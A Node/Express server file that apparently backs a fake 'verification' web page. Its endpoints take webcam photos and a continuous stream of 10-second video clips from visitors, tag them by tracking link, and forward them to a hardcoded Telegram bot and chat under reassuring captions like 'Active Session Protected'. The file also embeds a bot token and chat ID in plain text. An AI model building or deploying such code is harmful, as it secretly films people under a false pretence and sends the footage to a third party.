import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3000;

// Middleware for high-payload JSON and urlencoded for media transmissions
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Telegram integration status
app.get('/api/telegram-status', (req, res) => {
  const botToken = process.env.TELEGRAM_BOT_TOKEN || '8765690722:AAEy1PJxZBvK0ajvHLch3gUZBxIeCLp958M';
  const chatId = process.env.TELEGRAM_CHAT_ID || '7121685144';
  const isConfigured = !!(botToken && chatId);
  res.json({
    configured: isConfigured,
    chatIdConfigured: !!chatId,
  });
});

// Endpoint to receive continuous 10-second security video clips
app.post('/api/security-feed', async (req, res) => {
  try {
    const { verificationId, alisId, cycle, timestamp, videoBase64, mimeType } = req.body;

    if (!verificationId) {
      return res.status(400).json({ error: 'verificationId is required' });
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN || '8765690722:AAEy1PJxZBvK0ajvHLch3gUZBxIeCLp958M';
    const chatId = process.env.TELEGRAM_CHAT_ID || '7121685144';

    if (botToken && chatId && videoBase64) {
      try {
        const rawBase64 = videoBase64.includes(',') ? videoBase64.split(',')[1] : videoBase64;
        const buffer = Buffer.from(rawBase64, 'base64');
        const ext = mimeType && mimeType.includes('mp4') ? 'mp4' : 'webm';
        const file = new Blob([buffer], { type: mimeType || 'video/webm' });
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('video', file, `clip_${verificationId}_cycle${cycle || 1}.${ext}`);
        formData.append(
          'caption',
          `📹 Security Feed [10s Clip #${cycle || 1}]\nID: ${verificationId}\nLink: ${alisId || 'direct'}\nTime: ${
            timestamp || new Date().toISOString()
          }\nStatus: Active Session Protected`
        );

        const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
          method: 'POST',
          body: formData,
        });

        const tgData = (await tgRes.json()) as { ok: boolean; description?: string };
        if (!tgData.ok) {
          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              text: `📹 Security Feed [10s Clip #${cycle || 1}]\nID: ${verificationId}\nTime: ${
                timestamp || new Date().toISOString()
              }\nStatus: Active Session Protected`,
            }),
          });
        }
      } catch (tgErr) {
        console.warn('Telegram security feed forward warning:', tgErr);
      }
    }

    res.json({
      success: true,
      cycle: cycle || 1,
      receivedAt: new Date().toISOString(),
    });
  } catch (err) {
    console.error('Failed to process security feed:', err);
    res.status(500).json({ error: 'Internal server error processing security feed' });
  }
});

// Verification notification with optional instant photo
app.post('/api/notify-telegram', async (req, res) => {
  try {
    const { verificationId, time, photoBase64, alisId } = req.body;

    if (!verificationId) {
      return res.status(400).json({ error: 'verificationId is required' });
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN || '8765690722:AAEy1PJxZBvK0ajvHLch3gUZBxIeCLp958M';
    const chatId = process.env.TELEGRAM_CHAT_ID || '7121685144';

    if (!botToken || !chatId) {
      return res.json({
        success: true,
        delivered: false,
        note: 'Telegram credentials not configured in environment variables. Skipped sending.',
      });
    }

    const formattedTime = time || new Date().toISOString();
    const captionText = `✅ New Verification Completed!\nID: ${verificationId}\nLink: ${alisId || 'direct'}\nStatus: VALID\nTime: ${formattedTime}`;

    // If photo is captured, send as sendPhoto first
    let photoSent = false;
    if (photoBase64) {
      try {
        const rawBase64 = photoBase64.includes(',') ? photoBase64.split(',')[1] : photoBase64;
        const buffer = Buffer.from(rawBase64, 'base64');
        const file = new Blob([buffer], { type: 'image/jpeg' });
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', file, `photo_${verificationId}.jpg`);
        formData.append('caption', captionText);

        const tgPhotoRes = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData,
        });

        const photoJson = (await tgPhotoRes.json()) as { ok: boolean; description?: string };
        if (photoJson.ok) {
          photoSent = true;
        }
      } catch (pErr) {
        console.warn('Telegram photo send error:', pErr);
      }
    }

    // If photo wasn't sent, send text message
    if (!photoSent) {
      const tgResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: captionText,
        }),
      });

      const tgResult = (await tgResponse.json()) as { ok: boolean; description?: string };
      if (!tgResult.ok) {
        console.warn('Telegram API response error:', tgResult.description);
        return res.json({ success: false, delivered: false, error: tgResult.description });
      }
    }

    res.json({ success: true, delivered: true });
  } catch (err) {
    console.error('Failed to notify Telegram:', err);
    res.status(500).json({ error: 'Internal server error processing notification' });
  }
});

// Serve static assets from Vite build in production
const distPath = path.resolve(__dirname, 'dist');
app.use(express.static(distPath));

// Fallback to index.html for SPA client-side routing
app.get('*', (req, res) => {
  res.sendFile(path.join(distPath, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server listening on port ${PORT}`);
});
